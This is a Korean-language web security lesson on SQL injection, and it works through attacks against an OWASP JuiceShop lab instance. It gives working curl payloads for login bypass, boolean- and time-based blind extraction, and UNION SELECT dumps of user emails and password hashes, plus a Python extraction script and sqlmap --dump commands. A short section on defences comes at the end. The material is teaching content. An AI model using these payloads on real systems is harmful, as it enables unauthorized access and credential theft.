# Week 05: 입력값 검증 (1): SQL Injection

## 학습 목표
- SQL Injection의 원리와 유형을 이해한다
- Blind SQLi, Time-based SQLi, UNION SQLi를 구분할 수 있다
- JuiceShop에서 수동 SQLi 공격을 실습한다
- sqlmap을 이용한 자동화 점검을 수행할 수 있다

## 전제 조건
- SQL 기본 문법 (SELECT, WHERE, AND, OR)
- curl POST 요청 (Week 02)

---

## 1. SQL Injection 개요 (20분)

### 1.1 SQL Injection이란?

SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 직접 삽입되어 의도하지 않은 쿼리가 실행되는 취약점이다.

```
정상 쿼리:
SELECT * FROM users WHERE email='student@test.com' AND password='Test1234!'

공격 쿼리:
SELECT * FROM users WHERE email='' OR 1=1--' AND password='아무거나'
                              ^^^^^^^^^^^^^^^^
                              삽입된 공격 코드
```

`' OR 1=1--` 가 하는 일:
1. `'` → 기존 문자열 닫기
2. `OR 1=1` → 항상 참인 조건 추가
3. `--` → 나머지 쿼리 주석 처리

### 1.2 OWASP에서의 위치

SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에서 가장 위험한 취약점 중 하나이다.

### 1.3 SQL Injection 유형

| 유형 | 설명 | 결과 확인 방법 |
|------|------|---------------|
| **Classic (In-band)** | 쿼리 결과가 화면에 직접 출력 | 응답 본문 |
| **UNION-based** | UNION으로 추가 데이터 조회 | 응답에 추가 데이터 |
| **Blind (Boolean)** | 참/거짓에 따라 응답 차이 | 응답 길이/내용 차이 |
| **Time-based Blind** | 쿼리 지연으로 참/거짓 판별 | 응답 시간 |
| **Error-based** | DB 에러 메시지에 정보 노출 | 에러 메시지 |
| **Out-of-band** | DNS/HTTP 외부 채널로 데이터 전송 | 외부 서버 로그 |

---

## 2. JuiceShop 로그인 SQLi 실습 (30분)

### 2.1 기본 SQLi 공격 (Classic)

```bash
# 정상 로그인 시도 (실패)
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'
echo ""

# SQLi 공격: ' OR 1=1-- 을 이메일에 삽입
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' | python3 -m json.tool 2>/dev/null
echo ""

# JSON 이스케이프 버전
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"anything"}'
echo ""

# URL 인코딩 버전 (form-data 방식일 경우)
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' or 1=1--","password":"x"}'
```

### 2.2 특정 사용자로 로그인

```bash
# admin 계정으로 SQLi 로그인
# admin'-- 를 이메일에 넣으면 password 체크를 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" | python3 -m json.tool 2>/dev/null
```

### 2.3 에러 메시지 분석

```bash
# 문법 오류를 유발하여 DB 정보 획득
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\''","password":"x"}'

# 에러 메시지에서 확인할 것:
# - DB 종류 (SQLite, MySQL 등)
# - 테이블 이름
# - 쿼리 구조
```

---

## 3. Blind SQL Injection (30분)

### 3.1 Boolean-based Blind SQLi 원리

서버가 쿼리 결과를 직접 보여주지 않을 때, 참/거짓에 따른 **응답 차이**로 데이터를 한 글자씩 추출한다.

```
# 첫 번째 글자가 'a'인지 확인
' OR SUBSTRING(password,1,1)='a'--   → 응답 A (참)
' OR SUBSTRING(password,1,1)='b'--   → 응답 B (거짓)
```

### 3.2 JuiceShop 검색 기능에서 Blind SQLi

```bash
# JuiceShop 상품 검색 API
# 정상 검색
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# SQLi 시도: 항상 참
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))OR+1=1--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# SQLi 시도: 항상 거짓
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+1=2--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# 결과 수 차이가 있으면 SQLi 가능성 있음
```

### 3.3 Boolean Blind로 DB 버전 추출 (개념)

```bash
# SQLite 버전의 첫 글자가 '3'인지 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+SUBSTR(sqlite_version(),1,1)='3'--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# 자동화: 한 글자씩 추출
python3 << 'PYEOF'
import requests, string

url = "http://10.20.30.80:3000/rest/products/search"
result = ""
for pos in range(1, 20):
    found = False
    for c in string.printable[:62] + ".":  # 알파벳+숫자+점
        q = f"test'))AND SUBSTR(sqlite_version(),{pos},1)='{c}'--"
        r = requests.get(url, params={"q": q}, timeout=5)
        try:
            data = r.json().get("data", [])
            if len(data) > 0:
                result += c
                print(f"위치 {pos}: '{c}' (현재: {result})")
                found = True
                break
        except:
            pass
    if not found:
        break
print(f"\nDB 버전: {result}")
PYEOF
```

---

## 4. Time-based Blind SQLi (20분)

### 4.1 원리

서버 응답에 아무 차이가 없을 때, **의도적 지연**을 유발하여 참/거짓을 판별한다.

```sql
-- SQLite: CASE WHEN 조건 THEN ... (SQLite에서는 직접적 sleep 없음)
-- MySQL:  IF(조건, SLEEP(3), 0)
-- MSSQL:  IF 조건 WAITFOR DELAY '0:0:3'
```

### 4.2 Time-based 테스트

```bash
# 응답 시간 비교
echo "=== 정상 요청 ==="
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=apple"

echo ""
echo "=== Time-based SQLi 시도 ==="
# SQLite는 직접적인 sleep 함수가 없지만, 무거운 연산으로 지연 유발 가능
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=test'))AND+(SELECT+CASE+WHEN(1=1)+THEN+RANDOMBLOB(100000000)+ELSE+1+END)--"

# 두 번째 요청이 현저히 느리면 Time-based SQLi 가능
```

---

## 5. UNION-based SQLi (30분)

### 5.1 원리

UNION SELECT를 이용하여 원래 쿼리 결과에 추가 데이터를 결합한다.

```sql
-- 원래 쿼리
SELECT id, name, price FROM products WHERE name LIKE '%apple%'

-- UNION 공격
SELECT id, name, price FROM products WHERE name LIKE '%test%'
UNION SELECT 1, sql, 3 FROM sqlite_master--
```

### 5.2 컬럼 수 파악

UNION을 사용하려면 원래 쿼리의 컬럼 수를 알아야 한다.

```bash
# ORDER BY로 컬럼 수 파악
# 컬럼 수보다 큰 값을 넣으면 에러 발생
for i in 1 2 3 4 5 6 7 8 9 10; do
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))ORDER+BY+$i--")
  if echo "$result" | grep -qi "error"; then
    echo "컬럼 수: $((i-1))"
    break
  else
    echo "ORDER BY $i: OK"
  fi
done
```

### 5.3 UNION SELECT로 테이블 목록 조회

```bash
# SQLite의 sqlite_master에서 테이블 목록 추출
# 컬럼 수에 맞춰 NULL 패딩
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" | python3 -m json.tool 2>/dev/null | head -40
```

### 5.4 사용자 테이블 데이터 추출

```bash
# Users 테이블 구조 확인 후 데이터 추출
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin).get('data', [])
    for item in data:
        name = item.get('name', '')
        desc = item.get('description', '')
        if '@' in str(name) or '@' in str(desc):
            print(f'Email: {name}, Hash: {desc}')
except:
    print('파싱 실패 - 수동 확인 필요')
" 2>/dev/null
```

---

## 6. sqlmap 자동화 (30분)

### 6.1 기본 사용

```bash
# 검색 API에 대한 sqlmap 실행
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --level=2 --risk=1 --threads=4 \
  --technique=BEU \
  --timeout=10

# 옵션 설명:
# --batch: 모든 질문에 기본값 자동 응답
# --level=2: 점검 강도 (1~5, 높을수록 많은 페이로드)
# --risk=1: 위험도 (1~3, 높을수록 위험한 페이로드)
# --threads=4: 동시 요청 수
# --technique=BEU: Boolean, Error, Union 기법만 사용
```

### 6.2 DB 정보 추출

```bash
# 데이터베이스 목록
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --dbs --timeout=10

# 테이블 목록
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --tables --timeout=10

# 특정 테이블의 컬럼
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch -T Users --columns --timeout=10

# 데이터 덤프 (주의: 실제 환경에서는 반드시 허가 필요)
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch -T Users -C email,password --dump --timeout=10
```

### 6.3 POST 요청에 sqlmap 사용

```bash
# 로그인 API에 대한 sqlmap
sqlmap -u "http://10.20.30.80:3000/rest/user/login" \
  --method=POST \
  --data='{"email":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch --level=2 --risk=1 --timeout=10
```

### 6.4 sqlmap 결과 해석

```
sqlmap 출력 예시:
---
Parameter: q (GET)
    Type: boolean-based blind
    Payload: q=test' AND 1=1-- -

    Type: UNION query
    Payload: q=test' UNION ALL SELECT NULL,NULL,...-- -
---

→ "q" 파라미터에 SQLi 취약점 존재
→ Boolean Blind와 UNION 두 가지 기법으로 공격 가능
```

---

## 7. SQL Injection 방어 방법 (10분)

### 7.1 Prepared Statement (Parameterized Query)

```python
# 취약한 코드
query = f"SELECT * FROM users WHERE email='{email}'"

# 안전한 코드 (Prepared Statement)
cursor.execute("SELECT * FROM users WHERE email=?", (email,))
```

### 7.2 방어 체크리스트

| 방어 기법 | 설명 |
|----------|------|
| Prepared Statement | 쿼리와 데이터 분리 (최선) |
| ORM 사용 | SQLAlchemy, Django ORM 등 |
| 입력값 검증 | 화이트리스트 기반 필터링 |
| 최소 권한 DB 계정 | DB 사용자 권한 최소화 |
| WAF | 웹 방화벽으로 SQLi 패턴 차단 |
| 에러 메시지 숨김 | 상세 DB 에러 노출 방지 |

---

## 8. 실습 과제

### 과제 1: 수동 SQLi 공격
1. JuiceShop 로그인 API에서 SQLi로 admin 계정에 로그인하라
2. 검색 API에서 UNION SELECT로 Users 테이블의 이메일 목록을 추출하라
3. 각 공격에 사용한 페이로드를 기록하라

### 과제 2: sqlmap 자동 점검
1. sqlmap으로 JuiceShop의 검색 API를 스캔하라
2. 발견된 취약점의 유형과 위험도를 정리하라
3. Users 테이블의 구조(컬럼)를 추출하라

### 과제 3: 방어 관점 분석
1. JuiceShop에서 SQLi가 가능한 이유를 코드 관점에서 추론하라
2. 이 취약점을 방어하려면 어떤 수정이 필요한지 서술하라

---

## 9. 요약

| 유형 | 핵심 기법 | 탐지 방법 |
|------|----------|----------|
| Classic | ' OR 1=1-- | 응답에 추가 데이터 |
| UNION | UNION SELECT ... | 응답에 다른 테이블 데이터 |
| Blind (Boolean) | AND SUBSTR(...)='a' | 응답 차이 (참/거짓) |
| Time-based | SLEEP(3) / 무거운 연산 | 응답 시간 차이 |
| Error-based | 문법 오류 유발 | 에러 메시지 |

**다음 주 예고**: Week 06 - 입력값 검증 (2): XSS/CSRF. Reflected/Stored/DOM XSS와 CSRF 토큰 검증을 학습한다.
